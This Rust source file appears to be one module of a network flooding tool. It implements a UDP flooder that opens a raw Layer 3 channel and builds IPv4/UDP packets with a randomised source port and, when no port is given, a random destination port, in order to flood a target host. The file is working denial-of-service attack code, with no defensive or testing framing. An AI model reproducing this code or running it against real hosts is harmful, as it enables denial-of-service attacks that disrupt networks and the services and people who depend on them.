use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex};

use anyhow::Result;

use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::udp::MutableUdpPacket;
use pnet::packet::MutablePacket;
use pnet::transport::TransportChannelType::Layer3;
use pnet::transport::{transport_channel, TransportSender};

use pnet::util;
use rand::Rng;

use crate::cli::UdpArgs;

use super::{create_ipv4_packet, Flooder};

pub struct UdpFlooder {
  tx: Arc<Mutex<TransportSender>>,
  delay: u64,
  args: UdpArgs,
}

impl UdpFlooder {
  pub fn init(args: UdpArgs, delay: u64) -> Result<Self> {
    println!("UDP flood");
    println!("Payloading {}-byte packets", args.size);

    let (tx, _) = transport_channel(2 << 15, Layer3(IpNextHeaderProtocols::Udp)).unwrap();
    let mut args = args;
    args.src_port = Some(args.src_port.unwrap_or(rand::thread_rng().gen_range(49152..=65535)));
    Ok(Self {
      tx: Arc::new(Mutex::new(tx)),
      delay,
      args,
    })
  }
}

impl Flooder for UdpFlooder {
  type Args = UdpArgs;
  const PROTO_HEADER_LEN: usize = 8;

  fn clone(&self) -> (Arc<Mutex<TransportSender>>, Ipv4Addr, usize, Self::Args, u64) {
    (
      self.tx.clone(),
      self.args.host,
      self.args.size,
      self.args.clone(),
      self.delay,
    )
  }

  fn create_packet<'a>(buffer_ip: &'a mut [u8], buffer_udp: &'a mut [u8], args: Self::Args) -> MutableIpv4Packet<'a> {
    let udp_size = buffer_udp.len();
    let mut ipv4_packet = create_ipv4_packet(buffer_ip, args.host, IpNextHeaderProtocols::Udp, udp_size);

    let mut udp_packet = MutableUdpPacket::new(buffer_udp).expect("Error creating udp packet");
    udp_packet.set_source(args.src_port.unwrap());
    udp_packet.set_destination(args.port.unwrap_or(rand::thread_rng().gen_range(1..=65535)));
    udp_packet.set_length(udp_size as u16);
    let checksum = util::checksum(udp_packet.packet_mut(), 1);
    udp_packet.set_checksum(checksum);

    ipv4_packet.set_payload(udp_packet.packet_mut());
    ipv4_packet
  }
}
